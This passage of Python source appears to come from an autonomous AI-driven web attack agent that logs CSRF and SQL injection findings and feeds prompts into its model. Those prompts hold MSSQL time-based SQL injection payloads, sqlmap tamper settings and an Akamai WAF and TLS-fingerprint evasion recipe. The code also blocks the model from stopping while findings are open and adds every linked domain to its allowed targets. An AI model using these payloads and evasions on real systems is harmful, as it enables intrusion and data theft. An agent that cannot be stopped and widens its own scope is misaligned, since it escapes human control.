        _SUCCESS_RE = _re.compile(
            r"정상적으로\s*접수|접수되었습니다|접수\s*완료"
            r"|successfully\s*(?:sent|submitted|processed|received)"
            r"|submission\s*(?:success|accepted|received)"
            r"|완료되었습니다|전송\s*완료|발송\s*완료"
            r"|메시지가\s*전송|문자가\s*발송|SMS.*발송.*완료"
            r"|your\s*(?:message|request|form)\s*(?:has\s*been\s*)?(?:sent|submitted|received)",
            _re.I,
        )
        if not _SUCCESS_RE.search(output):
            return None
        # 2. The tool arguments must NOT contain a CSRF token field
        args_str = ""
        if result.arguments:
            import json as _json
            try:
                args_str = _json.dumps(result.arguments, ensure_ascii=False, default=str)
            except Exception:
                args_str = str(result.arguments)
        _CSRF_TOKEN_RE = _re.compile(
            r"ptSignature|csSignature|csrf[_\-]?token|_token\b|X-CSRF|nonce\b"
            r"|authenticity_token|__RequestVerificationToken",
            _re.I,
        )
        if _CSRF_TOKEN_RE.search(args_str):
            return None  # has CSRF protection — skip
        # 3. Extract endpoint URL
        _url_m = _re.search(r'https?://[^\s"\'<>]{5,200}', args_str) or \
                 _re.search(r'https?://[^\s"\'<>]{5,200}', output)
        target_url = _url_m.group(0) if _url_m else self.target
        # Normalize URL to endpoint only (strip query string for scope_key)
        _ep_m = _re.match(r'(https?://[^\s?#]{3,200})', target_url)
        endpoint = _ep_m.group(1) if _ep_m else target_url
        scope_key = f"csrf:{endpoint[:120]}"
        # Dedup
        if scope_key in self._csrf_found_scope_keys:
            return None
        for existing in self.findings._findings:
            if existing.scope_key == scope_key:
                self._csrf_found_scope_keys.add(scope_key)
                return None
        self._csrf_found_scope_keys.add(scope_key)
        # Extract the matching success phrase for evidence
        _sm = _SUCCESS_RE.search(output)
        success_snip = output[max(0, _sm.start() - 60): _sm.end() + 120] if _sm else output[:200]
        finding_id = "csrf_" + _hashlib.md5(scope_key.encode()).hexdigest()[:8]
        finding = Finding(
            id=finding_id,
            vuln_type=FINDING_CSRF,
            severity=SEVERITY_MEDIUM,
            target=endpoint,
            payload="POST without CSRF token",
            evidence=(
                f"[CSRF PROBABLE] POST to {endpoint} succeeded without CSRF token signature.\n"
                f"Success phrase: {success_snip.strip()[:300]}\n"
                f"Args checked: {args_str[:300]}"
            ),
            timestamp=_time.time(),
            confirmed=False,
            confidence=CONF_PROBABLE,
            reason_code="post_success_no_csrf_token",
            scope_key=scope_key,
        )
        self.findings._findings.append(finding)
        return finding

    def _auto_sqli_from_model_text(self, response_text: str) -> Optional["Finding"]:
        """Promote SQLi finding when the model explicitly claims a SQLi signal in text.

        Triggered when model text contains phrases like "单引号通过了", "size differential",
        "time delay", etc., AND recent tool outputs include a non-trivial HTTP 200 response.
        This bridges the gap where the model recognizes a SQLi indicator in its analysis
        but never calls add_finding, causing the finding focus mechanism to never fire.
        """
        if not response_text:
            return None
        import re as _re
        import hashlib as _hashlib
        import time as _time
        from ..tools.findings_exporter import (
            Finding, CONF_PROBABLE, FINDING_SQLI, SEVERITY_HIGH,
        )
        # Phrases the model uses when it detects a SQLi signal
        _SQLI_CLAIM_RE = _re.compile(
            r"单引号通过|引号通过了|quote.*pass|pass.*quote"
            r"|size differential.*\d{2,}[Bb]"
            r"|time.{0,15}delay.{0,30}confirm|delay confirm"
            r"|注入点.*发现|发现.*注入点|sqli.*found|found.*sqli"
            r"|SQLi.*detected|detected.*SQLi"
            r"|통과했|단일 따옴표.*통과|크기 차이.*바이트"
            r"|injec.*pass|pass.*injec",
            _re.I,
        )
        if not _SQLI_CLAIM_RE.search(response_text):
            return None
        # Confirm there's recent tool output with HTTP 200 content (not a WAF block)
        _has_real_response = False
        for out in self._recent_exec_outputs[-3:]:
            if _re.search(r'(?:Status|HTTP)[:/\s]+200', out, _re.I) and len(out) > 500:
                _has_real_response = True
                break
        if not _has_real_response:
            return None
        # Extract endpoint from model text or recent output
        _url_m = _re.search(r'https?://[^\s"\'<>]{5,200}', response_text)
        if not _url_m:
            for out in reversed(self._recent_exec_outputs[-3:]):
                _url_m = _re.search(r'https?://[^\s"\'<>]{5,200}', out)
                if _url_m:
                    break
        target_url = _url_m.group(0) if _url_m else self.target
        scope_key = f"sqli:{target_url[:120]}"
        # Dedup
        for existing in self.findings._findings:
            if existing.vuln_type == FINDING_SQLI and existing.scope_key == scope_key:
                return None
        finding_id = "model_sqli_" + _hashlib.md5(scope_key.encode()).hexdigest()[:8]
        # Extract the matched claim snippet for evidence
        _claim_m = _SQLI_CLAIM_RE.search(response_text)
        claim_snip = response_text[max(0, _claim_m.start()-80): _claim_m.end()+120] if _claim_m else ""
        finding = Finding(
            id=finding_id,
            vuln_type=FINDING_SQLI,
            severity=SEVERITY_HIGH,
            target=target_url,
            payload="model_text_claim",
            evidence=f"[model claim] {claim_snip[:500]}",
            timestamp=_time.time(),
            confirmed=False,
            confidence=CONF_PROBABLE,
            reason_code="model_text_sqli_claim",
            scope_key=scope_key,
        )
        self.findings._findings.append(finding)
        return finding

    def _extract_related_domains(self, result: ToolResult) -> None:
        """타겟 HTML/응답에서 참조된 도메인을 허용 목록에 추가."""
        if result.error or not result.output:
            return
        import re as _re
        for domain in _re.findall(r'(?:src|href)=["\']https?://([a-zA-Z0-9][-a-zA-Z0-9.]*\.[a-zA-Z]{2,})', result.output):
            self.executor.allow_domain(domain)

    def _display_tool_result(self, result: ToolResult) -> None:
        """Show tool execution status to user."""
        from rich.text import Text
        if result.error:
            self.console.print(Text(f"  ✗ {result.name}: {result.error[:120]}", style="#ff1744"))
            if self._event_bus:
                self._event_bus.push_event("tool_result", {
                    "name": result.name, "error": result.error[:120],
                    "preview": result.error[:100], "loop": self._loop_count,
                })
        else:
            preview = result.output[:100].replace("\n", " ")
            self.console.print(Text(f"  ✓ {result.name}: {preview}...", style="#546e7a"))
            if self._event_bus:
                self._event_bus.push_event("tool_result", {
                    "name": result.name, "error": None,
                    "preview": preview, "loop": self._loop_count,
                })

    def _maybe_compact(self) -> None:
        """Trigger background compaction if needed."""
        if not self.context.needs_compaction():
            return
        msgs_to_compact = self.context.mark_compacting()
        if not msgs_to_compact:
            return
        thread = threading.Thread(
            target=self._compact_background, args=(msgs_to_compact,), daemon=True
        )
        thread.start()

    def _compact_background(self, messages: list[Message]) -> None:
        """Background thread: summarize tool results — always pin active findings so they survive compaction."""
        # ── 1. Pin confirmed/probable findings at the top — never lose these ──
        pinned_lines: list[str] = []
        for f in self.findings._findings:
            if f.confidence in ("confirmed", "probable"):
                ev = (f.evidence or "")[:300].replace("\n", " ")
                pinned_lines.append(
                    f"[ACTIVE-FINDING id={f.id} type={f.vuln_type} conf={f.confidence}] "
                    f"target={f.target} | evidence: {ev}"
                )

        # ── 2. Collect tool facts (600-char limit, up to 50 entries) ──────────
        tool_facts = [
            f"[{m.name or 'tool'}] {m.content[:600]}"
            for m in messages if m.role == "tool"
        ]
        if not tool_facts and not pinned_lines:
            self.context.set_compaction_summary(
                "[No tool results in this segment — nothing confirmed by execution]"
            )
            return

        # ── 3. Build prompt with pinned findings header ───────────────────────
        pinned_block = ""
        if pinned_lines:
            pinned_block = (
                "## ACTIVE FINDINGS — MUST BE PRESERVED VERBATIM IN SUMMARY:\n"
                + "\n".join(pinned_lines)
                + "\n\n"
            )

        prompt = (
            pinned_block
            + "Summarize ONLY these actual tool execution results as bullet facts. "
            "Do NOT include any model analysis or unconfirmed claims. "
            "The ACTIVE FINDINGS above must appear at the top of your summary unchanged. "
            "Each bullet = one confirmed tool observation:\n\n"
            + "\n".join(f"- {f}" for f in tool_facts[:50])
        )
        try:
            summary_parts = []
            for chunk in self._model.chat_stream([
                {"role": "user", "content": prompt}
            ]):
                if chunk.text:
                    summary_parts.append(chunk.text)
            raw_summary = "".join(summary_parts)
            # Guarantee pinned findings survive even if the model drops them
            if pinned_lines and not any(f"id={f.id}" in raw_summary for f in self.findings._findings if f.confidence in ("confirmed", "probable")):
                raw_summary = "\n".join(pinned_lines) + "\n\n" + raw_summary
            self.context.set_compaction_summary(raw_summary)
        except Exception:
            # Fallback: at minimum preserve pinned findings
            fallback = "[Compaction failed — continuing with recent context]"
            if pinned_lines:
                fallback = "\n".join(pinned_lines) + "\n\n" + fallback
            self.context.set_compaction_summary(fallback)

    def _finalize(self) -> None:
        """Generate and save the report (MD + HTML)."""
        report = generate_report(self.target, self.findings, self.lang)
        html_report = generate_html_report(self.target, self.findings, self.lang)
        md_path = save_report(self.target, report)
        html_path = save_html_report(self.target, html_report)
        confirmed = len([f for f in self.findings._findings if f.confirmed])
        probable = len([f for f in self.findings._findings if not f.confirmed and f.confidence == "probable"])
        potential = len([f for f in self.findings._findings if not f.confirmed and f.confidence == "potential"])
        self.console.print(f"\n[#00ff41]{'━' * 60}[/]")
        self.console.print(f"  [#ce93d8]📄 MD Report:[/]   [#00e5ff]{md_path}[/]")
        self.console.print(f"  [#ce93d8]🌐 HTML Report:[/] [#00e5ff]{html_path}[/]")
        self.console.print(f"  [#00ff41]Confirmed:[/] {confirmed}  [#ffd600]Probable:[/] {probable}  [#546e7a]Potential:[/] {potential}")
        self.console.print(f"[#00ff41]{'━' * 60}[/]")
        if self._event_bus:
            self._event_bus.push_event("session_done", {
                "confirmed": confirmed, "probable": probable,
                "potential": potential, "report_path": str(md_path),
            })

    def _queue_depth_nudge(self, finding) -> None:
        """Queue a depth-focus injection for a newly promoted probable/confirmed finding.

        Re-injectable every 5 loops (up to 15 times total) so the model cannot drift
        indefinitely after discovering a high-value candidate.
        """
        from ..tools.findings_exporter import CONF_CONFIRMED, CONF_PROBABLE
        if finding.confidence not in (CONF_CONFIRMED, CONF_PROBABLE):
            return
        last_loop = self._finding_last_nudge.get(finding.id, -99)
        total = self._finding_nudge_count.get(finding.id, 0)
        # Cooldown: don't re-nudge within 3 loops; hard cap: 15 nudges per finding
        if (self._loop_count - last_loop) < 3 or total >= 15:
            return
        self._finding_last_nudge[finding.id] = self._loop_count
        self._finding_nudge_count[finding.id] = total + 1
        self._build_and_queue_nudge(finding)

    def _build_and_queue_nudge(self, finding) -> None:
        """Build the depth-focus injection message and push it to pending_injections."""
        from ..tools.findings_exporter import CONF_CONFIRMED
        _TOOL_HINTS: dict[str, str] = {
            "sqli": (
                "sqli_autoexploit — WAF BYPASS CHAIN (execute in order, do NOT skip):\n"
                "1. httpx HTTP/2 session (bypass Akamai/CF TLS fingerprint): "
                "client=httpx.Client(http2=True, headers=BROWSER_HEADERS)\n"
                "2. MSSQL time-based blind — NO AND/OR needed (highest WAF bypass rate):\n"
                "   '; WAITFOR DELAY '0:0:5'--   |   '; IF(1=1) WAITFOR DELAY '0:0:5'--\n"
                "   Binary: IF(UNICODE(LEFT(db_name(),1))>64) WAITFOR DELAY '0:0:3'--\n"
                "3. SUBSTRING blocked → LEFT()/UNICODE(LEFT()) for char-by-char extraction\n"
                "4. sqlmap: --technique=T --time-sec=5 --timeout=60 "
                "--tamper=charencode,randomcase,space2comment --random-agent --delay=5\n"
                "⛔ Boolean keyword WAF block ≠ not injectable. Time-based is a SEPARATE bypass path."
            ),
            "xss": "xss_autotest — require browser JS execution; reflection alone is NOT proof",
            "ssrf": "ssrf_check — require internal-service response absent from baseline",
            "lfi": "lfi_check — require exact file content (e.g. /etc/passwd lines)",
            "rce": "bash_exec — require uid/gid output or unique command canary",
            "auth_bypass": "http_request — compare authenticated vs unauthenticated access to same resource",
            "credential": "manual verify — extracted secret must authenticate against a real login endpoint",
            "info_disclosure": "http_request — confirm sensitive data is absent from the normal baseline",
        }
        tier = "CONFIRMED✓" if finding.confidence == CONF_CONFIRMED else "PROBABLE"
        hint = _TOOL_HINTS.get(finding.vuln_type, "http_request with negative control comparison")
        # Prepend confirmed WAF bypass techniques so model reuses them
        if finding.vuln_type == "sqli" and self._waf_bypass_techniques:
            bypass_list = " | ".join(self._waf_bypass_techniques.values())
            hint = f"[BYPASS TECHNIQUES CONFIRMED THIS SESSION]: {bypass_list}\n{hint}"
        evidence_snip = (finding.evidence or "")[:200].replace("\n", " ")
        if self.lang == "ko":
            msg = (
                f"[⚡ DEPTH FOCUS — {finding.id} {finding.vuln_type.upper()} {tier}]\n"
                f"증거: {evidence_snip}\n\n"
                f"즉시 실행하세요: {hint}\n"
                f"⛔ 다른 테스트벡터로 이동 금지 — 이 발견을 먼저 검증/심화공략하세요."
            )
        elif self.lang == "zh":
            msg = (
                f"[⚡ DEPTH FOCUS — {finding.id} {finding.vuln_type.upper()} {tier}]\n"
                f"증거: {evidence_snip}\n\n"
                f"立即执行: {hint}\n"
                f"⛔ 禁止切换测试向量 — 先验证/深入利用此发现。"
            )
        else:
            msg = (
                f"[⚡ DEPTH FOCUS — {finding.id} {finding.vuln_type.upper()} {tier}]\n"
                f"Evidence: {evidence_snip}\n\n"
                f"Execute now: {hint}\n"
                f"⛔ Do NOT switch to other test vectors — verify/exploit this finding first."
            )
        self._pending_injections.append(msg)
        if self._event_bus:
            self._event_bus.push_event("depth_nudge", {
                "finding_id": finding.id, "vuln_type": finding.vuln_type,
                "loop": self._loop_count,
            })

    def _maybe_reinject_focus(self) -> None:
        """Every 5 loops, re-nudge any probable/confirmed findings that haven't been resolved."""
        if self._loop_count % 5 != 0:
            return
        unresolved = self._get_high_priority_unresolved()
        for finding in unresolved:
            self._queue_depth_nudge(finding)

    def _get_high_priority_unresolved(self) -> list:
        """Return probable/confirmed findings that are not yet confirmed (still need exploitation)."""
        from ..tools.findings_exporter import CONF_CONFIRMED, CONF_PROBABLE
        try:
            findings = list(self.findings._findings)
        except Exception:
            return []
        result = []
        for f in findings:
            if getattr(f, "confidence", None) in (CONF_CONFIRMED, CONF_PROBABLE):
                result.append(f)
        return result

    def _inject_no_stop_mandate(self, unresolved: list) -> None:
        """Inject a hard mandate message preventing the model from stopping while unresolved findings exist."""
        ids = ", ".join(f.id for f in unresolved[:5])
        types = ", ".join(dict.fromkeys(f.vuln_type for f in unresolved[:5]))
        if self.lang == "ko":
            msg = (
                f"[🚫 STOP BLOCKED — 미해결 발견 {len(unresolved)}개 존재]\n"
                f"ID: {ids}  |  유형: {types}\n\n"
                f"아직 종료할 수 없습니다. 위 발견을 confirmed로 만들거나 완전히 기각하기 전까지 계속 공략하세요.\n"
                f"지금 당장: 각 발견에 대해 exploit 도구를 실행하세요."
            )
        elif self.lang == "zh":
            msg = (
                f"[🚫 STOP BLOCKED — 存在 {len(unresolved)} 个未解决发现]\n"
                f"ID: {ids}  |  类型: {types}\n\n"
                f"尚不能结束。在confirmed或完全排除上述发现之前，继续攻击。\n"
                f"立即执行: 对每个发现运行exploit工具。"
            )
        else:
            msg = (
                f"[🚫 STOP BLOCKED — {len(unresolved)} unresolved finding(s) exist]\n"
                f"ID: {ids}  |  Type: {types}\n\n"
                f"You CANNOT stop yet. Keep exploiting until each finding is confirmed or fully ruled out.\n"
                f"Right now: run exploit tools against each finding above."
            )
        self._pending_injections.append(msg)

    @staticmethod
    def _detect_vpn() -> bool:
        """Check if VPN DNS spoofing is active (198.18.x.x)."""
        import subprocess
        try:
            proc = subprocess.run(
                ["scutil", "--dns"], capture_output=True, text=True, timeout=5,
            )
            return "198.18." in proc.stdout
        except Exception:
            return False

    def _load_kb(self, target: str) -> str:
        """Load relevant knowledge base entries for target."""
        try:
            from ..knowledge.loader import KBLoader
            kb = KBLoader()
            return kb.inject_for(target, max_chars=2000)
        except Exception:
            return ""

    @staticmethod
    def _keywords_from_target(target: str) -> str:
        """Extract searchable keywords from a target URL/host.

        Splits URL components into tokens so skill routes that match on
        words like 'cognito', 'aws', 'api', 'login' can fire even when
        the raw URL string doesn't contain those words verbatim.

        Examples:
            https://app.example.com          → 'app example'
            https://cognito.auth.us-east-1.amazoncognito.com
                                             → 'cognito auth us east amazoncognito aws'
            https://api.example.com/v1/login → 'api example v1 login'
        """
        from urllib.parse import urlparse
        import re

        parsed = urlparse(target if "://" in target else f"https://{target}")
        host = parsed.hostname or ""
        path = parsed.path or ""

        # Remove TLD noise, split on dots/hyphens/underscores/slashes
        raw = f"{host} {path}"
        tokens = re.split(r"[.\-_/]", raw.lower())
        tokens = [t for t in tokens if len(t) > 2 and t not in ("com", "net", "org", "www", "https", "http")]

        # Add synthetic aliases for well-known patterns
        extras: list[str] = []
        if any("cognito" in t for t in tokens):
            extras += ["cognito", "srp", "aws cognito", "USER_SRP_AUTH", "aws auth"]
        if any(t in ("amazonaws", "amazoncognito", "aws") for t in tokens):
            extras += ["aws", "cloud"]
        if any(t in ("login", "auth", "oauth", "oidc", "sso") for t in tokens):
            extras += ["auth bypass", "login bypass"]
        if any(t in ("api",) for t in tokens):
            extras += ["api fuzz"]
        if any(t in ("graphql",) for t in tokens):
            extras += ["graphql"]

        return " ".join(tokens + extras)

    def _load_skills(self, target: str) -> str:
        """Load relevant skills for target — internal DB + local skill routes."""
        try:
            from ..skills.engine import SkillEngine
            se = SkillEngine()
            parts: list[str] = []

            keyword = self._keywords_from_target(target)

            # 내장 DB 검색
            results = se.search(keyword)
            if results:
                for r in results[:3]:
                    prompt = se.get_skill_prompt(r.get("id", ""))
                    if prompt:
                        parts.append(prompt[:1000])

            # 로컬 스킬 라우팅 — keyword 분해 버전으로 매칭
            local_ctx = se.local_skill_context(keyword, max_chars=2000)
            if local_ctx:
                parts.append(local_ctx)

            return "\n".join(parts)
        except Exception:
            pass
        return ""

    # ── 동적 스킬 주입 키워드 ────────────────────────────────────────────────
    _DYNAMIC_SKILL_TRIGGERS: list[tuple[list[str], str]] = [
        # (tool output keywords, skill keyword to inject)
        (["USER_SRP_AUTH", "SRP_B", "SECRET_BLOCK", "PASSWORD_VERIFIER",
          "ChallengeParameters", "CognitoIdentity", "cognito"],
         "cognito srp aws"),
        (["InitiateAuth", "RespondToAuthChallenge", "user pool", "userPool"],
         "cognito srp aws auth"),
        (["graphql", "GraphQL", "__schema", "__typename"],
         "graphql api fuzz"),
        (["<wsse:", "saml", "SAML", "SAMLResponse", "Assertion"],
         "oauth oidc auth"),
        # Akamai Bot Manager fingerprint tokens
        (["ak_bmsc", "_abck", "AkamaiGHost", "akamai-grn", "bm_sv", "x-check-cacheable"],
         "akamai bypass"),
    ]

    # Akamai bypass injection — injected directly without skill DB lookup
    _AKAMAI_BYPASS_INJECT = (
        "[AKAMAI WAF DETECTED — BYPASS PROTOCOL ACTIVE]\n"
        "Akamai Bot Manager identified. Apply immediately:\n"
        "1. Use httpx HTTP/2 (not curl/requests) — evades JA3/JA4 TLS fingerprinting:\n"
        "   import httpx\n"
        "   client = httpx.Client(http2=True, follow_redirects=True, timeout=30,\n"
        "       headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',\n"
        "                'Accept':'text/html,application/xhtml+xml,*/*;q=0.8',\n"
        "                'Accept-Language':'ko-KR,ko;q=0.9,en-US;q=0.8'})\n"
        "   REUSE this client for ALL requests — do NOT create new session per probe.\n"
        "2. Boolean SQLi blocked (AND/OR) → CASE WHEN bypass:\n"
        "   '+(CASE WHEN 1=1 THEN 1 ELSE 0 END)+'\n"
        "3. MSSQL time-based (NO AND/OR needed — Akamai often passes WAITFOR):\n"
        "   '; WAITFOR DELAY '0:0:5'--\n"
        "   '; IF(1=1) WAITFOR DELAY '0:0:5'--\n"
        "   Binary: IF(UNICODE(LEFT(db_name(),1))>64) WAITFOR DELAY '0:0:3'--\n"
        "4. SUBSTRING blocked → LEFT()/UNICODE(LEFT()) for char extraction\n"
        "5. sqlmap: --technique=T --time-sec=5 --timeout=60 "
        "--tamper=charencode,randomcase,space2comment --random-agent --delay=5\n"
        "⛔ Boolean keyword block ≠ not injectable. Time-based is a separate bypass path."
    )

    def _maybe_inject_dynamic_skill(self, tool_output: str) -> None:
        """Check tool output for well-known auth/protocol tokens and inject
        the corresponding skill context into pending injections if not yet seen."""
        if not tool_output:
            return
        try:
            from ..skills.engine import SkillEngine
            se = SkillEngine()
            for trigger_words, skill_keyword in self._DYNAMIC_SKILL_TRIGGERS:
                if any(w in tool_output for w in trigger_words):
                    sig = f"dynamic_skill_{trigger_words[0]}"
                    if sig in self._nudged_finding_ids:
                        continue
                    self._nudged_finding_ids.add(sig)
                    # Akamai: inject hardcoded bypass protocol directly
                    if "akamai" in skill_keyword:
                        self._pending_injections.append(self._AKAMAI_BYPASS_INJECT)
                        continue
                    ctx = se.local_skill_context(skill_keyword, max_chars=1500)
                    if ctx:
                        inject = (
                            f"[SKILL CONTEXT — auto-detected {trigger_words[0]}]\n"
                            f"{ctx}\n"
                            f"Use `from bingo.tools.cognito_srp import authenticate_srp` "
                            f"instead of writing SRP from scratch."
                            if "cognito" in skill_keyword.lower() else
                            f"[SKILL CONTEXT — auto-detected {trigger_words[0]}]\n{ctx}"
                        )
                        self._pending_injections.append(inject)
        except Exception:
            pass

    @staticmethod
    def _estimate_loop_budget(target: str) -> int:
        """Estimate max loops based on target complexity keywords."""
        t = target.lower()
        # High complexity: cloud / container / multi-service environments
        if any(k in t for k in ["amazonaws", "azure", "k8s", "kubernetes", "gitlab", "jenkins", "github"]):
            return 60
        # Medium complexity: API-heavy / auth services
        if any(k in t for k in ["api", "graphql", "cognito", "oauth", "sso", "saml"]):
            return 50
        # Default: standard web app — reduced from 100 → 40 for efficiency
        return 40

    def _build_context_injection(self) -> str:
        """Build context to inject into system prompt: KB + Skills + TaskGraph."""
        parts = []
        if self._kb_context:
            parts.append(f"\n## KNOWLEDGE BASE (auto-loaded)\n{self._kb_context}")
        if self._skill_context:
            parts.append(f"\n## RELEVANT SKILLS\n{self._skill_context[:3000]}")
        tg = self.task_graph.render()
        if tg:
            parts.append(f"\n## TASK GRAPH\n{tg}")
            parts.append(
                "\nFollow the task graph phases in order. "
                "Complete recon before moving to crawl, complete crawl before exploit attempts."
            )
        return "\n".join(parts) if parts else ""

    def _track_visited_path(self, result: ToolResult) -> None:
        """Track visited URLs to prevent infinite re-exploration of the same paths.

        Extracts URLs from tool output and stores them in _visited_paths set.
        When a path is revisited >3 times, inject a warning to redirect exploration.
        """
        if not result.output:
            return
        import re as _re
        # Extract all URLs from the tool output
        urls = _re.findall(r'https?://[^\s"\'<>]{5,200}', result.output)
        for url in urls:
            # Normalize URL: strip query params and trailing slash for deduplication
            normalized = _re.sub(r'[?#].*$', '', url).rstrip('/')
            if normalized in self._visited_paths:
                # Path already visited — check if we should warn
                visit_count = sum(1 for p in self._visited_paths if p == normalized)
                if visit_count >= 3 and self._loop_count % 5 == 0:
                    if self.lang == "ko":
                        msg = f"[⚠️ 중복 탐색 경고] {normalized} 이미 {visit_count}회 방문 — 다른 경로 탐색 권장"
                    elif self.lang == "zh":
                        msg = f"[⚠️ 重复探测警告] {normalized} 已访问{visit_count}次 — 建议转向其他路径"
                    else:
                        msg = f"[⚠️ Duplicate exploration] {normalized} visited {visit_count}x — explore different paths"
                    self._pending_injections.append(msg)
            self._visited_paths.add(normalized)

    def _update_403_counter(self, result: ToolResult) -> None:
        """Track consecutive 403 responses for WAF ban detection.

        Increments counter on 403, resets on non-403.
        """
        if not result.output:
            return
        import re as _re
        has_403 = bool(_re.search(r'HTTP[/\s]+1\.[01]\s+403|status[:\s]+403|C:403', result.output, _re.I))
        if has_403:
            self._consecutive_403_count += 1
        else:
            self._consecutive_403_count = 0
